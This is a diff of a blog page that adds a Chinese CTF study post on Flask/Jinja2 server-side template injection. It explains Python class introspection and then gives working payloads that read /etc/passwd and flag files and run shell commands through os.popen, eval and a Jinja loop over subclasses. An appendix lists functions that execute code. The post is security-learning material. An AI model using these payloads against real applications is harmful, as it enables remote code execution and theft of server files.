@@ -22,7 +22,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>Sayingの魔法书</title>
+  <title>flask模板注入 - Sayingの魔法书</title>
+  
+    <meta name="keywords" content="CTF-web,SSTI,python">
   
 
   
@@ -351,7 +353,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper list featured' style="display: none;">
+        <div id="full" class='cover-wrapper post featured' style="display: none;">
           
             <div id='cover-backstretch'></div>
           
@@ -414,42 +416,295 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper" id="pjax-container">
           
 
-
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
-    <section class="post-list">
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-        
-      
-    </section>
+
+
   
+    <div class='headimg-div'>
+      <a class='headimg-a'>
+        <img class='headimg' src='https://gitee.com/saying_yy/blog-image/raw/master/img/20210606142813.png'/>
+      </a>
+    </div>
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        flask模板注入
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/CTF-web/">CTF-web</a>
+    </a>
+  </div>
+
+
+          
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Aug 16, 2020</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="flask模板注入" data-path="/2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <h1 id="Flask模板注入（一）"><a href="#Flask模板注入（一）" class="headerlink" title="Flask模板注入（一）"></a>Flask模板注入（一）</h1><p>Flask中使用了Jinja2作为模板渲染引擎，Jinja2会将<code>{{}}</code>中包裹的内容当作变量解析替换。当服务器接受了用户的输入并将其作为模板的一部分，在渲染的过程中就可能渲染了用户插入的恶意内容，导致敏感信息泄露甚至代码执行。</p>
+<h2 id="1、实现模板注入"><a href="#1、实现模板注入" class="headerlink" title="1、实现模板注入"></a>1、实现模板注入</h2><h3 id="1-1-基础知识"><a href="#1-1-基础知识" class="headerlink" title="1.1 基础知识"></a>1.1 基础知识</h3><h4 id="（1）-class-获取当前实例的类对象"><a href="#（1）-class-获取当前实例的类对象" class="headerlink" title="（1）_class_ 获取当前实例的类对象"></a>（1）_<em>class</em>_ 获取当前实例的类对象</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__</span><br><span class="line">&lt;type &#x27;str&#x27;&gt;       //空字符串是一个实例，对应的类是&lt;type &#x27;str&#x27;&gt; </span><br><span class="line">&gt;&gt;&gt; [].__class__</span><br><span class="line">&lt;type &#x27;list&#x27;&gt;      //空列表串是一个实例，对应的类是&lt;type &#x27;list&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）-base-获取当前类的一个继承类"><a href="#（2）-base-获取当前类的一个继承类" class="headerlink" title="（2）_base_ 获取当前类的一个继承类"></a>（2）_<em>base</em>_ 获取当前类的一个继承类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__</span><br><span class="line">&lt;type &#x27;basestring&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__base__</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;       //在python2.7中大部分类都继承了object类</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）-mro-获取当前类的所有继承类"><a href="#（3）-mro-获取当前类的所有继承类" class="headerlink" title="（3）_mro_ 获取当前类的所有继承类"></a>（3）_<em>mro</em>_ 获取当前类的所有继承类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__</span><br><span class="line">(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)</span><br><span class="line">&gt;&gt;&gt; [].__class__.__mro__</span><br><span class="line">(&lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="（4）-subclasses-获取当前类的所有继承类列表"><a href="#（4）-subclasses-获取当前类的所有继承类列表" class="headerlink" title="（4）_subclasses_() 获取当前类的所有继承类列表"></a>（4）_<em>subclasses</em>_() 获取当前类的所有继承类列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40]</span><br><span class="line">&lt;type &#x27;file&#x27;&gt;             //object的第40个子类</span><br><span class="line"></span><br><span class="line">//python2和python3的不同版本在object的子类中有较大不同</span><br></pre></td></tr></table></figure>
+
+<h4 id="（5）-init-用于将对象实例化"><a href="#（5）-init-用于将对象实例化" class="headerlink" title="（5）_init_ 用于将对象实例化"></a>（5）_<em>init</em>_ 用于将对象实例化</h4><h4 id="（6）-dict-用于列出当前属性-函数的字典"><a href="#（6）-dict-用于列出当前属性-函数的字典" class="headerlink" title="（6）_dict_ 用于列出当前属性/函数的字典"></a>（6）_<em>dict</em>_ 用于列出当前属性/函数的字典</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].os</span><br><span class="line">&lt;module &#x27;os&#x27; from &#x27;D:\python2.7\lib\os.pyc&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;]</span><br><span class="line">&lt;module &#x27;os&#x27; from &#x27;D:\python2.7\lib\os.pyc&#x27;&gt;</span><br><span class="line">\\这里感觉没有什么区别</span><br></pre></td></tr></table></figure>
+
+<h4 id="（7）-getitem"><a href="#（7）-getitem" class="headerlink" title="（7） _getitem_"></a>（7） _<em>getitem</em>_</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__</span><br><span class="line">(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(1)</span><br><span class="line">&lt;type &#x27;basestring&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2)</span><br><span class="line">&lt;type &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="（8）func-globals-返回一个包含函数全局变量的字典引用"><a href="#（8）func-globals-返回一个包含函数全局变量的字典引用" class="headerlink" title="（8）func_globals 返回一个包含函数全局变量的字典引用"></a>（8）func_globals 返回一个包含函数全局变量的字典引用</h4><h4 id="（9）-globals-对保存函数全局变量-定义函数的模块的全局名称空间-的字典的引用。"><a href="#（9）-globals-对保存函数全局变量-定义函数的模块的全局名称空间-的字典的引用。" class="headerlink" title="（9）_globals_  对保存函数全局变量(定义函数的模块的全局名称空间)的字典的引用。"></a>（9）_<em>globals</em>_  对保存函数全局变量(定义函数的模块的全局名称空间)的字典的引用。</h4><h3 id="1-2-实现恶意命令注入"><a href="#1-2-实现恶意命令注入" class="headerlink" title="1.2 实现恶意命令注入"></a>1.2 实现恶意命令注入</h3><h4 id="（1）文件读取"><a href="#（1）文件读取" class="headerlink" title="（1）文件读取"></a>（1）文件读取</h4><p>在object的所有子类中可以找到file类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[40]</span><br><span class="line">&lt;type &#x27;file&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40]</span><br><span class="line">&lt;type &#x27;file&#x27;&gt;             //object的第40个子类一般为file</span><br></pre></td></tr></table></figure>
+
+<p>故可以进行文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40](&#x27;/etc/passwd&#x27;)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）命令执行-方法1"><a href="#（2）命令执行-方法1" class="headerlink" title="（2）命令执行-方法1"></a>（2）命令执行-方法1</h4><p>包含os模块的两个类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[72]</span><br><span class="line">&lt;class &#x27;site._Printer&#x27;&gt;   //这里环境该类位于object的第72个子类。但环境不同位置可能不同</span><br><span class="line">&lt;class &#x27;site.Quitter&#x27;&gt;    //这里环境该类位于object的第77个子类。但环境不同位置可能不同</span><br></pre></td></tr></table></figure>
+
+<p>实现命令执行的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)</span><br><span class="line">//在注入时，直接使用system函数可能导致无回显，故可以使用popen函数</span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）命令执行-方法2"><a href="#（3）命令执行-方法2" class="headerlink" title="（3）命令执行-方法2"></a>（3）命令执行-方法2</h4><p>利用warnings.catch_warnings模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[60]</span><br><span class="line">&lt;class &#x27;warnings.catch_warnings&#x27;&gt;   //这里环境该类位于object的第60个子类。但环境不同位置可能不同</span><br></pre></td></tr></table></figure>
+
+<p>实现命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].os.popen(&#x27;whoami&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<p>再补充一些payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;whoami&#x27;).read()</span><br><span class="line">&#x27;laptop-91trpmfu\\admin\n&#x27;</span><br><span class="line">\\利用__dict__可以绕过某些黑名单</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; object.__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)</span><br><span class="line">&#x27;laptop-91trpmfu\\admin\n&#x27;</span><br><span class="line">\\使用eval</span><br></pre></td></tr></table></figure>
+
+<h4 id="（4）遍历找到catch-warnings的payload"><a href="#（4）遍历找到catch-warnings的payload" class="headerlink" title="（4）遍历找到catch_warnings的payload"></a>（4）遍历找到catch_warnings的payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//执行命令</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">//读文件</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、附录"><a href="#2、附录" class="headerlink" title="2、附录"></a>2、附录</h2><h3 id="2-1-一些任意代码执行及读取文件函数"><a href="#2-1-一些任意代码执行及读取文件函数" class="headerlink" title="2.1 一些任意代码执行及读取文件函数"></a>2.1 一些任意代码执行及读取文件函数</h3><h4 id="（1）os执行系统命令"><a href="#（1）os执行系统命令" class="headerlink" title="（1）os执行系统命令"></a>（1）os执行系统命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;ipconfig&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）exec-任意代码执行"><a href="#（2）exec-任意代码执行" class="headerlink" title="（2）exec  任意代码执行"></a>（2）<strong>exec</strong>  任意代码执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）eval-任意代码执行"><a href="#（3）eval-任意代码执行" class="headerlink" title="（3）eval  任意代码执行"></a>（3）eval  任意代码执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="（4）timeit-本是检测性能的，也可以任意代码执行"><a href="#（4）timeit-本是检测性能的，也可以任意代码执行" class="headerlink" title="（4）timeit  本是检测性能的，也可以任意代码执行"></a>（4）<strong>timeit</strong>  本是检测性能的，也可以任意代码执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;ipconfig&#x27;)&quot;,number=1)</span><br></pre></td></tr></table></figure>
+
+<h4 id="（5）platform"><a href="#（5）platform" class="headerlink" title="（5）platform"></a>（5）<strong>platform</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import platform</span><br><span class="line">platform.popen(&#x27;ipconfig&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<h4 id="（6）subprocess"><a href="#（6）subprocess" class="headerlink" title="（6）subprocess"></a>（6）<strong>subprocess</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">subprocess.Popen(&#x27;ipconfig&#x27;, shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()</span><br></pre></td></tr></table></figure>
+
+<h4 id="（7）file"><a href="#（7）file" class="headerlink" title="（7）file"></a>（7）file</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<h4 id="（8）open"><a href="#（8）open" class="headerlink" title="（8）open"></a>（8）open</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<h4 id="（9）codecs"><a href="#（9）codecs" class="headerlink" title="（9）codecs"></a>（9）codecs</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import codecs</span><br><span class="line">codecs.open(&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<h2 id="3、然而……这只是基础"><a href="#3、然而……这只是基础" class="headerlink" title="3、然而……这只是基础"></a>3、然而……这只是基础</h2><p>后续会相继补上：</p>
+<p><a href="">flask模板注入（2）</a></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/9415641.html">python 模板注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/12764599.html">Flask模板注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yh1013024906/article/details/84330056">FLASK模板注入（SSTI）</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸</a></p>
+<p>还有一个基础而重要的  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/wancy86/p/6243725.html">python <em>_globals</em><em>,  _<em>file</em></em></a></p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/>http://example.com/2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-06T14:36:07+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：Jun 6, 2021</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CTF-web/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CTF-web</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/SSTI/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>SSTI</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/python/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>python</p></a></div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/&title=flask模板注入 - Sayingの魔法书&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/&title=flask模板注入 - Sayingの魔法书&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/&title=flask模板注入 - Sayingの魔法书&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
+  
+  
+
+  
+    <div class="prev-next">
+      
+        <a class='prev' href='/2020/08/24/unicode%E7%9A%84%E5%B0%8F%E6%8A%8A%E6%88%8F/'>
+          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>unicode的小把戏</p>
+          <p class='content'>UnicodeUnicode是计算机科学领域里的一项业界标准，它为每种语言中的每个字符设定了统一并且唯一的二进制编码。
+下面来说一说一些unicode的trick 
+QQ聊天小尾巴（仅限手机端）...</p>
+        </a>
+      
+      
+        <a class='next' href='/2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/'>
+          <p class='title'>报错注入<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>报错注入之前都是做题中积累经验，感觉自己的基础薄弱。大部分时候都是看别人的WP才能做题。最近在看一本《CTF训练营》，补一补基础，做笔记。
+报错注入的条件
+可回显
+回显有报错信息
+过滤不严格（希...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+  </article>
+
+
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -457,141 +712,28 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img no-lazy src='https://gitee.com/saying_yy/blog-image/raw/master/img/2.jpg'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-          <h2>Saying</h2>
-        
-        
-          <p>一只蒻苟</p>
 
-        
-        
-          <p><span id="jinrishici-sentence">Sayingの魔法书</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/1396318209@qq.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://github.com/saying-yan"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
 
-  
-
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
     
   <header>
     
-      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
     
   </header>
 
 
     <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/CTF-web/" href="/categories/CTF-web/"
-            id="categoriesCTF-web"
-            ><div class='name'>CTF-web</div><div class='badge'>(2)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/Dian/" href="/categories/Dian/"
-            id="categoriesDian"
-            ><div class='name'>Dian</div><div class='badge'>(1)</div></a></li>
-        
-          <li><a class="flat-box"
-            title="/categories/misc/" href="/categories/misc/"
-            id="categoriesmisc"
-            ><div class='name'>misc</div><div class='badge'>(1)</div></a></li>
-        
-      </ul>
